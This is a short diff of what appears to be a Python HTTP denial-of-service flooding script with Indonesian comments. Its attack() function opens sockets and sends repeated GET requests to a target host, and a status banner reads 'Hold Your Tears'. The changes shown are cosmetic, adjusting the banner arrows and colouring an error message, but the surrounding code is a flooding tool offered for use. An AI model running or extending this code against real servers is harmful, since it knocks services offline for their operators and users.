@@ -65,7 +65,7 @@ def print_status():
 
     thread_num += 1
     #print output pada baris yang sama
-    sys.stdout.write(f"\033[01m {time.ctime().split( )[3]} [{str(thread_num)}] =>-==>-===> Hold Your Tears ====>-====>-====>>\033[0m|")
+    sys.stdout.write(f"\033[01m {time.ctime().split( )[3]} [{str(thread_num)}] =>>-=>>-=>> Hold Your Tears =>>-=>>-=>>\033[0m|")
     sys.stdout.flush()
     thread_num_mutex.release()
 
@@ -93,7 +93,7 @@ def attack():
         byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
         dos.send(byt)
     except socket.error:
-        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
+        print (f"\033[33m [ No connection, server may be down ]: {str(socket.error)}\033[0m")
     finally:
         # Tutup soket dengan rapi
         dos.shutdown(socket.SHUT_RDWR)
